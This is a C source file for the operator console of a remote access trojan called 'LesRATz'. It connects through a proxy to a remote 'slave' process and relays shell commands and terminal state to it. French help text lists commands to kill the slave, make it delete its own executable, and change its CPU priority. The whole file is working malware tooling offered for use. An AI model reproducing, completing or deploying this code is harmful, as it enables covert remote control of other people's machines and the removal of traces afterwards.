/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

#include "netshell.h"

static inline
void	eperror(const char* msg)
{
	perror(msg);
	exit(1);
}

void	connect_to_proxy(s_nshell* ratz)
{
	ratz->net.addri.sin_port = htons(PORT);
	ratz->net.addri.sin_family = AF_INET;
	if (inet_pton(AF_INET, ADDRESS, &ratz->net.addri.sin_addr) == -1)
		eperror("inet_pton");
	else
	{
		if ((ratz->net.in = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			eperror("socket");
		else if ((ratz->net.out = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			eperror("socket");
		else
			if (connect(ratz->net.in, (const s_sockaddr*)&ratz->net.addri, sizeof(ratz->net.addri)) == -1)
				eperror("connect");
	}
	fcntl(ratz->net.in, F_SETFL, ~O_NONBLOCK);
	fcntl(ratz->net.out, F_SETFL, ~O_NONBLOCK);
	if (send(ratz->net.in, "ai", 2, 0) <= 0)
		eperror("send");
	if (connect(ratz->net.out, (const s_sockaddr*)&ratz->net.addri, sizeof(ratz->net.addri)) == -1)
		eperror("connect");
	if (send(ratz->net.out, "ao", 2, 0) <= 0)
		eperror("send");
}

void	sig_handler(int signum)
{
	if (signum == SIGINT)
	{
		rl_on_new_line();
		rl_redisplay();
		rl_replace_line("", 0);
		write(STDOUT_FILENO, "\n", 1);
		write(STDOUT_FILENO, RATZ_PROMPT, strlen(RATZ_PROMPT));
	}
}

void	builtin_exit(s_nshell* ratz)
{
	printf("exit\n");
	write(ratz->net.in, "exit\n", 6);
	ratz->killed = true;
}

void	builtin_clear(s_nshell* ratz)
{
	(void)ratz;
	int	chd = fork();

	if (chd == 0)
		exit(execlp("clear", "clear", NULL));
	while (waitpid(chd, NULL, WNOHANG) == 0)
		;
}

void	__help__(void)
{
	printf("\e[1m\e[34mHELP INFOs - LesRATz\e[0m\n");
	printf("\e[34m- Redéfinition de certaines commandes.\e[0m\n");
	printf("\e[34m- Nouvelle commande avec le préfixe et suffixe \"__\".\e[0m\n\n");

	printf("\e[1m\e[32m__quit__\e[0m\n");
	printf("   Quitte le programme esclave en fermant les connexions et les processus associés.\n\n");

	printf("\e[1m\e[32m__delete__\e[0m\n");
	printf("   Supprime le fichier exécutable et quitte le programme esclave.\n\n");
	
	printf("\e[1m\e[32m__cpu__ {X}\e[0m\n");
	printf("   Affiche ou modifie la priorité CPU du processus.\n");
	printf("   \e[1mX\e[0m : Valeur entre \e[1m-20\e[0m (priorité max) et \e[1m19\e[0m (priorité min).\n");
	printf("   Ne peut pas augmenter la priorité si le processus esclave n'est pas route.\n");
	printf("   Ne rendra pas plus efficace les commandes demandées.\n");
	printf("   Sans argument, affiche la priorité actuelle.\n\n");

	printf("\e[1m\e[32mexit \e[0m\e[32mor\e[1m ^-D\e[0m\n");
	printf("   NE termine pas le processus esclave, mais termine uniquement le processus controleur (celui-ci).\n");

	printf("\e[1m\e[32mclear\e[0m\n");
	printf("   CLEAR le terminal controleur.\n");
}

char	__cpu__(s_nshell ratz, char* prompt)
{
	int	value = atoi(&((char*)prompt)[strlen("__cpu__")]);

	if (strlen((char*)prompt) == strlen("__cpu__") || value == 0)
	{
		fcntl(ratz.net.out, F_SETFL, fcntl(ratz.net.out, F_GETFL) & ~O_NONBLOCK);
		recv(ratz.net.out, &value, sizeof(value), 0);
		fcntl(ratz.net.out, F_SETFL, fcntl(ratz.net.out, F_GETFL) | O_NONBLOCK);
		printf("CPU usage [-20, 19] : %d\n", value);
	}
	return (true);
}

char	netbuiltins(s_nshell ratz, char* prompt)
{
	if (!strncmp(ratz.buffer, "__cpu__", strlen("__cpu__")))
		__cpu__(ratz, ratz.buffer);
	else if (!strcmp(ratz.buffer, "__quit__") || !strcmp(ratz.buffer, "__delete__"))
	{
		close(ratz.net.in);
		close(ratz.net.out);
		close(ratz.term.fd);
		free(prompt);
		exit(0);
	}
	return (false);
}

static inline
void	signal_stuff(void)
{
	struct sigaction	sa;
	sa.sa_flags = 0;
	sigemptyset(&sa.sa_mask);
	sa.sa_handler = sig_handler;
	sigaction(SIGINT, &sa, NULL);
}

void	init_termios(s_term* term)
{
	if ((term->fd = open("/dev/tty", O_RDWR)) == -1)
		eperror("open(\"/dev/tty\")");
	tcgetattr(term->fd, &term->base);
}

static inline
void	reset_term_attr(s_term* term)
{
	if (term->is_sync == true)
	{
		tcsetattr(term->fd, TCSANOW, &term->base);
		term->shater = false;
		term->is_sync = false;
	}
}

static inline
void	get_shared_term_attr(s_nshell* ratz, void* buffer)
{
	s___r	obj;

	memmove(&obj, buffer, sizeof(s___r));
	tcsetattr(ratz->term.fd, TCSADRAIN, &obj.t);
	ratz->term.is_sync = true;
	ratz->term.shater = true;
}

int	main(void)
{
	s_nshell	ratz;

	signal_stuff();
	memset(&ratz, 0, sizeof(s_nshell));
	connect_to_proxy(&ratz);
	init_termios(&ratz.term);
	fcntl(STDIN_FILENO, F_SETFL, fcntl(STDIN_FILENO, F_GETFL) | O_NONBLOCK);
	fcntl(ratz.net.out, F_SETFL, O_NONBLOCK);
	//recv auth errors
	while (ratz.killed == false)
	{
		ratz.buffer = readline(RATZ_PROMPT);
		if (!ratz.buffer)
			builtin_exit(&ratz);
		else if (ratz.buffer[0])
		{
			if (!strcmp(ratz.buffer, "exit"))
				builtin_exit(&ratz);
			else if (!strcmp(ratz.buffer, "clear"))
				builtin_clear(&ratz);
			else if (!strcmp(ratz.buffer, "__help__"))
				__help__();
			else if (strcmp(ratz.buffer, "\003"))
			{
					// starting bidirectionnal sending/receiving data
				send(ratz.net.in, ratz.buffer, strlen(ratz.buffer), 0);
				if (netbuiltins(ratz, ratz.buffer) == false)
				{
					while (true)
					{
						//printf("while (true)");
						ratz.len = recv(ratz.net.out, ratz.msg, DEBUG_SIZE_MAX, 0);
						if (ratz.len > 0)
						{
							if ((ratz.buffer = strstr(ratz.msg, SHATER)))
							{
								if (ratz.len > ESCSEQ)
								{
									write(STDOUT_FILENO, ratz.msg, (unsigned long long)((char*)ratz.buffer - (char*)ratz.msg));
									get_shared_term_attr(&ratz, ratz.buffer);
									write(STDOUT_FILENO, &ratz.buffer[sizeof(s___r)], strlen(&ratz.buffer[sizeof(s___r)]));
								}
								else
									get_shared_term_attr(&ratz, ratz.buffer);
							}
							if (strstr(ratz.msg, EONING))
							{
								if (ratz.len > ESCSEQ && ratz.term.shater == false)	// 10 = strlen(EONING)
									write(STDOUT_FILENO, ratz.msg, ratz.len - 10);
								break ;
							}
							else if (ratz.term.shater == false)
								write(STDOUT_FILENO, ratz.msg, ratz.len);
							ratz.term.shater = false;
						}
						memset(ratz.msg, 0, DEBUG_SIZE_MAX);
						ratz.len = read(STDIN_FILENO, ratz.msg, DEBUG_SIZE_MAX); // faire un readall jusqu'à '\n' ou ' \003'
						if (ratz.len > 0)
						{
							ratz.msg[ratz.len] = 0;	
							if (ratz.msg[ratz.len] != '\003')
								ratz.msg[ratz.len] = '\n';
							send(ratz.net.in, ratz.msg, ratz.len, 0);
						}
					}
					ratz.term.shater = false;
					reset_term_attr(&ratz.term);
				}
			}
		}
		free(ratz.buffer);
		ratz.buffer = NULL;
	}
	free(ratz.buffer);
	close(ratz.net.in);
	close(ratz.net.out);
	close(ratz.term.fd);
	return (0);
}
